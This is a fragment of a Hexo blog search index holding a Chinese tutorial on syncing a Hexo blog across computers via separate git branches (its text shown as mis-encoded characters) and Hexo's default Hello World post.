      <url>/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ä¹ æƒ¯ä½¿ç”¨å­¦æ ¡æœºæˆ¿å†™ç¬”è®°ï¼Œåˆä¸èˆå¾—æ”¾ä¸‹è‡ªå·±ç”µè„‘çš„ç¬”è®°ï¼ŒæŸ¥é˜…äº†ç½‘ä¸Šèµ„æ–™åï¼Œå°±æœ‰äº†è¿™ä¸€ç¯‡æ–‡ç« </p><p>åšå®¢ä¸»é¢˜é‡‡ç”¨äº†ä¿®æ”¹ç‰ˆæœ¬cactusä¸»é¢˜ï¼š<a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank" rel="noopener">https://github.com/xuthus5/hexo-theme-cactus</a></p><h3 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h3><p>hexoé¡¹ç›®çš„ç›®å½•ç»“æ„å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HEXO</span><br><span class="line">â”œâ”€â”€.deploy_git/</span><br><span class="line">â”œâ”€â”€node_modules/</span><br><span class="line">â”œâ”€â”€public/</span><br><span class="line">â”œâ”€â”€scaffolds/</span><br><span class="line">â”œâ”€â”€<span class="built_in">source</span>/</span><br><span class="line">â”œâ”€â”€themes/</span><br><span class="line">â”œâ”€â”€_config.yml</span><br><span class="line">â”œâ”€â”€.gitignore</span><br><span class="line">â”œâ”€â”€db.json</span><br><span class="line">â”œâ”€â”€debug.log</span><br><span class="line">â””â”€â”€package.json</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­.deploy_gitã€publicä¸¤ä¸ªæ–‡ä»¶å¤¹ä¸‹å­˜æ”¾çš„æ˜¯åšå®¢æ–‡ç« çš„é™æ€é¡µé¢ï¼Œé€šè¿‡å¯¹æ¯”githubä¸Šåšå®¢ä»“åº“çš„masteråˆ†æ”¯å¯ä»¥çœ‹åˆ°masteråˆ†æ”¯ä¸‹é¢çš„æ–‡ä»¶ç»“æ„å’Œ.deploy_gitæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶æ˜¯ä¸€è‡´çš„ï¼Œè¿™ä¸ªåº”è¯¥å¯ä»¥åˆ¤æ–­é€šè¿‡hexo g -då‘å¸ƒåˆ°githubçš„å†…å®¹å°±æ˜¯.deploy_gitæ–‡ä»¶å¤¹ä¸‹é¢çš„æ–‡ä»¶ã€‚å…¶ä½™çš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶å³æ˜¯Hexoçš„ä¸»é¢˜æ–‡ä»¶ã€åŸå§‹çš„åšå®¢æ–‡ä»¶ç­‰ï¼Œåˆšåœ¨ä¸Šæ–‡æåˆ°çš„hexoåˆ†æ”¯ï¼Œå­˜çš„å³æ—¶è¿™äº›æ–‡ä»¶ã€‚</p></blockquote><h3 id="æ–¹æ¡ˆåŸç†åˆ†æ"><a href="#æ–¹æ¡ˆåŸç†åˆ†æ" class="headerlink" title="æ–¹æ¡ˆåŸç†åˆ†æ"></a>æ–¹æ¡ˆåŸç†åˆ†æ</h3><blockquote><p>æ–¹æ¡ˆä¸»è¦æ˜¯é€šè¿‡ç»´æŠ¤ä¸¤æ¡gitåˆ†æ”¯æ¥å®ç°ï¼Œç¬¬ä¸€ä¸ªåˆ†æ”¯æ˜¯gihubä¸Šé»˜è®¤çš„masteråˆ†æ”¯ï¼Œç”¨äºå­˜æ”¾å‘å¸ƒçš„åšæ–‡çš„é™æ€é¡µé¢ï¼›å¦å¤–å†æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œæ¯”å¦‚å‘½åä¸ºhexoï¼Œé€šè¿‡æ­¤åˆ†æ”¯å­˜æ”¾ä¸»é¢˜ã€åŸå§‹çš„åšå®¢æ–‡ä»¶ç­‰ç­‰ï¼Œè¿™äº›æ–‡ä»¶æ‰æ˜¯ä¸åŒç”µè„‘éœ€è¦åŒæ­¥çš„æ–‡ä»¶ï¼›å½“æ¯æ¬¡ä¿®æ”¹ä¸»é¢˜æˆ–è€…æ–°å¢åšæ–‡åï¼Œå…ˆå°†ä¿®æ”¹çš„ä¸»é¢˜æ–‡ä»¶ï¼ˆåœ¨themesæ–‡ä»¶å¤¹ä¸‹ï¼‰æˆ–è€…æ–°å¢åšå®¢ï¼ˆåœ¨sourceæ–‡ä»¶å¤¹ä¸‹ï¼‰ï¼ŒåŒæ­¥åˆ°è¿œç¨‹çš„hexoåˆ†æ”¯ï¼Œç„¶ååœ¨é€šè¿‡hexo g -då‘½ä»¤å‘å¸ƒåšæ–‡ï¼Œä¹Ÿå°±æ˜¯å°†æ–°å¢çš„åšæ–‡çš„é™æ€é¡µé¢åŒæ­¥åˆ°masteråˆ†æ”¯ã€‚è¿™æ ·é€šè¿‡ä¸åŒçš„åˆ†æ”¯ç®¡ç†ä¸åŒçš„æ–‡ä»¶ï¼Œå®ç°äº†å¤šå°ç”µè„‘åŒæ­¥æ›´æ–°åšæ–‡çš„åŠŸèƒ½ã€‚</p></blockquote><p>æŠ€æœ¯æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><p><img src="/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/1.png" alt></p><h3 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h3><ul><li><p>åˆ›å»ºåˆ†æ”¯ï¼ˆåœ¨githubä¸Šæ“ä½œï¼‰</p><p><strong>åœ¨Githubè¿œç¨‹åˆ›å»º hexo branch</strong>ï¼Œå¹¶å°†æ–°çš„<strong>hexo</strong> branch <strong>è®¾ç½®æˆ Default branch</strong>ï¼Œæ›¿ä»£åŸæœ¬çš„é»˜è®¤åˆ†æ”¯: master branch</p></li><li><p>åˆå§‹åŒ–åˆ†æ”¯ï¼ˆPC1ä¸Šé¢æ“ä½œï¼‰</p><ul><li>githubä¸Šåˆ‡æ¢åˆ°hexoåˆ†æ”¯ï¼Œ<code>git clone</code>ä»“åº“åˆ°æœ¬åœ°ã€‚</li><li>æ­¤æ—¶æœ¬åœ°ä¼šå¤šå‡ºä¸€ä¸ª<code>username.github.io</code>æ–‡ä»¶å¤¹ï¼Œå‘½ä»¤è¡Œ<code>cd</code>è¿›å»ï¼Œåˆ é™¤é™¤<code>.git</code>æ–‡ä»¶å¤¹ï¼ˆå¦‚æœä½ çœ‹ä¸åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œè¯´æ˜æ˜¯éšè—äº†ã€‚4</li><li>å‘½ä»¤è¡Œ<code>git add -A</code>æŠŠå·¥ä½œåŒºçš„å˜åŒ–ï¼ˆåŒ…æ‹¬å·²åˆ é™¤çš„æ–‡ä»¶ï¼‰æäº¤åˆ°æš‚å­˜åŒºï¼ˆps:<code>git add .</code>æäº¤çš„å˜åŒ–ä¸åŒ…æ‹¬å·²åˆ é™¤çš„æ–‡ä»¶ï¼‰ã€‚</li><li>å‘½ä»¤è¡Œ<code>git commint -m &quot;some description&quot;</code>æäº¤ã€‚</li><li>å‘½ä»¤è¡Œ<code>git push origin hexo</code>æ¨é€åˆ°è¿œç¨‹hexoåˆ†æ”¯ã€‚æ­¤æ—¶åˆ·ä¸‹githubï¼Œå¦‚æœæ­£å¸¸æ“ä½œï¼Œhexoåˆ†æ”¯åº”è¯¥å·²ç»è¢«æ¸…ç©ºäº†ã€‚</li><li>å¤åˆ¶æœ¬åœ°<code>username.github.io</code>æ–‡ä»¶å¤¹ä¸­çš„<code>.git</code>æ–‡ä»¶å¤¹åˆ°hexoé¡¹ç›®æ ¹ç›®å½•ä¸‹ã€‚æ­¤æ—¶ï¼Œhexoé¡¹ç›®å·²ç»å˜æˆäº†å’Œè¿œç¨‹hexoåˆ†æ”¯å…³è”çš„æœ¬åœ°ä»“åº“äº†ã€‚è€Œ<code>username.github.io</code>æ–‡ä»¶å¤¹çš„ä½¿å‘½åˆ°æ­¤ä¸ºæ­¢ï¼Œä½ å¯ä»¥æŠŠå®ƒåˆ æ‰ï¼Œå› ä¸ºæˆ‘ä»¬åªæ˜¯æŠŠå®ƒä½œä¸ºä¸€ä¸ªâ€œä¸­è½¬ç«™â€çš„è§’è‰²ã€‚ä»¥åæ¯æ¬¡å‘å¸ƒæ–°æ–‡ç« æˆ–ä¿®æ”¹ç½‘ç«™æ ·å¼æ–‡ä»¶æ—¶ï¼Œ<code>git add . &amp; git commit -m &quot;some description&quot; &amp; git push origin hexo -f</code>å³å¯æŠŠç¯å¢ƒæ–‡ä»¶æ¨é€åˆ°hexoåˆ†æ”¯ã€‚ç„¶åå†<code>hexo g -d</code>å‘å¸ƒç½‘ç«™å¹¶æ¨é€é™æ€æ–‡ä»¶åˆ°masteråˆ†æ”¯ã€‚</li></ul></li><li><p>åŒæ­¥åˆ†æ”¯ï¼ˆPC2ä¸Šé¢æ“ä½œï¼‰</p><ul><li>å®‰è£…hexoï¼š<code>npm install -g hexo-cli</code></li><li>cloneè¿œç¨‹ä»“åº“åˆ°æœ¬åœ° <code>git clone git@github.com:username/username.github.io.git</code></li><li>æ ¹æ®<code>packge.json</code>å®‰è£…ä¾èµ–<code>npm install &amp;&amp; npm install hexo-deployer-git</code></li><li>æ­¤æ—¶é€šè¿‡å‘½ä»¤git gã€git så³å¯åœ¨æœ¬åœ°å¼€å¯åŒæ­¥ä¸‹æ¥çš„åšå®¢é™æ€é¡µé¢ï¼Œå¹¶é€šè¿‡ <a href="https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%3A4000%2F" target="_blank" rel="noopener">http://localhost:4000/</a> è®¿é—®</li></ul></li><li><p>å‘å¸ƒåšæ–‡ï¼ˆPC1æˆ–è€…PC2ï¼‰</p><ul><li><code>git pull</code>ä»è¿œç¨‹hexoåˆ†æ”¯æ‹‰å–æœ€æ–°çš„ç¯å¢ƒæ–‡ä»¶åˆ°æœ¬åœ°ï¼Œå¯ä»¥ç†è§£ä¸ºsvnçš„æ›´æ–°æ“ä½œã€‚æ¯”å¦‚åœ¨å…¬å¸å†™äº†åšå®¢ï¼Œå›å®¶åœ¨ç”µè„‘ä¸Šä¹Ÿè¦å†™éœ€è¦å…ˆæ‰§è¡Œè¿™ä¸€æ­¥æ“ä½œã€‚</li><li>æ–‡ç« å†™å®Œï¼Œè¦å‘å¸ƒæ—¶ï¼Œéœ€è¦å…ˆæäº¤ç¯å¢ƒæ–‡ä»¶ï¼Œå†å‘å¸ƒæ–‡ç« ã€‚æŒ‰ä»¥ä¸‹é¡ºåºæ‰§è¡Œå‘½ä»¤<code>it add . &amp; git commit -m &quot;some description&quot; &amp; git push origin hexo -f</code>,æœ€åæ‰§è¡Œ<code>hexo g -d</code></li></ul></li></ul><h3 id="è¡¥å……å†…å®¹"><a href="#è¡¥å……å†…å®¹" class="headerlink" title="è¡¥å……å†…å®¹"></a>è¡¥å……å†…å®¹</h3><h4 id="æ–‡ç« ä¸­æ’å…¥å›¾ç‰‡"><a href="#æ–‡ç« ä¸­æ’å…¥å›¾ç‰‡" class="headerlink" title="æ–‡ç« ä¸­æ’å…¥å›¾ç‰‡"></a>æ–‡ç« ä¸­æ’å…¥å›¾ç‰‡</h4><ol><li>è®¾ç½®ç«™ç‚¹é…ç½®<code>_config.yml:</code>å°†<code>post_asset_folder: false</code>æ”¹ä¸º<code>post_asset_folder: true</code></li><li>å®‰è£…æ’ä»¶:<code>npm install https://github.com/CodeFalling/hexo-asset-image -- save</code></li><li>è¿è¡Œ<code>hexo n &quot;XXXXXX&quot;</code>,ç”ŸæˆXXXXX.mdåšæ–‡æ—¶å°±ä¼šåœ¨<code>/source/_posts</code>ç›®å½•ä¸‹ç”ŸæˆXXXXXXçš„æ–‡ä»¶å¤¹ï¼Œå°†ä½ æƒ³åœ¨XXXXXåšæ–‡ä¸­æ’å…¥çš„ç…§ç‰‡æ”¾ç½®åˆ°è¿™ä¸ªåŒåæ–‡ä»¶å¤¹ä¸­å³å¯ï¼Œå›¾ç‰‡çš„å‘½åéšæ„ã€‚</li><li>æ·»åŠ å›¾ç‰‡:åœ¨æƒ³æ·»åŠ çš„ä½ç½®å†™å…¥<code>![](å›¾ç‰‡åå­—.å›¾ç‰‡æ ¼å¼)</code>,ä¾‹å¦‚<code>![](1.png)</code></li></ol><h4 id="æ–‡ç« åŠ å¯†"><a href="#æ–‡ç« åŠ å¯†" class="headerlink" title="æ–‡ç« åŠ å¯†"></a>æ–‡ç« åŠ å¯†</h4><ol><li>å®‰è£…<code>npm install --save hexo-blog-encrypt</code></li><li>é¦–å…ˆåœ¨ <strong>ç«™ç‚¹é…ç½®æ–‡ä»¶</strong> ä¸­å¯ç”¨è¯¥æ’ä»¶:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><ol start="3"><li>ç„¶ååœ¨ä½ çš„æ–‡ç« çš„å¤´éƒ¨æ·»åŠ ä¸Šå¯¹åº”çš„å­—æ®µï¼Œå¦‚ password, abstract, message</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">---</span></span><br><span class="line"><span class="selector-tag">title</span>: æ–‡ç« åŠ å¯†</span><br><span class="line"><span class="selector-tag">date</span>: 2019<span class="selector-tag">-01-04T22</span><span class="selector-pseudo">:20</span><span class="selector-pseudo">:13.000Z</span></span><br><span class="line"><span class="selector-tag">category</span>: æ•™ç¨‹</span><br><span class="line"><span class="selector-tag">tags</span>:</span><br><span class="line">  <span class="selector-tag">-</span> åšå®¢</span><br><span class="line">  <span class="selector-tag">-</span> <span class="selector-tag">Hexo</span></span><br><span class="line"><span class="selector-tag">keywords</span>: åšå®¢æ–‡ç« å¯†ç </span><br><span class="line"><span class="selector-tag">password</span>: <span class="selector-tag">TloveY</span></span><br><span class="line"><span class="selector-tag">abstract</span>: å¯†ç ï¼š<span class="selector-tag">TloveY</span></span><br><span class="line"><span class="selector-tag">message</span>:  è¾“å…¥å¯†ç ï¼ŒæŸ¥çœ‹æ–‡ç« </span><br><span class="line"><span class="selector-tag">---</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒèµ„æ–™</p><blockquote><p><a href="https://blog.csdn.net/Fitz1318/article/details/86548129" target="_blank" rel="noopener">https://blog.csdn.net/Fitz1318/article/details/86548129</a></p><p><a href="https://www.jianshu.com/p/44e211829447" target="_blank" rel="noopener">https://www.jianshu.com/p/44e211829447</a></p><p><a href="https://www.jianshu.com/p/fceaf373d797" target="_blank" rel="noopener">https://www.jianshu.com/p/fceaf373d797</a></p><p><a href="https://www.dazhuanlan.com/2019/11/16/5dd00ffcb4f27/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/11/16/5dd00ffcb4f27/</a></p><p><a href="https://www.jianshu.com/p/937bda9123da" target="_blank" rel="noopener">https://www.jianshu.com/p/937bda9123da</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> å¤šç«¯åŒæ­¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/03/17/hello-world/"/>
      <url>/2020/03/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
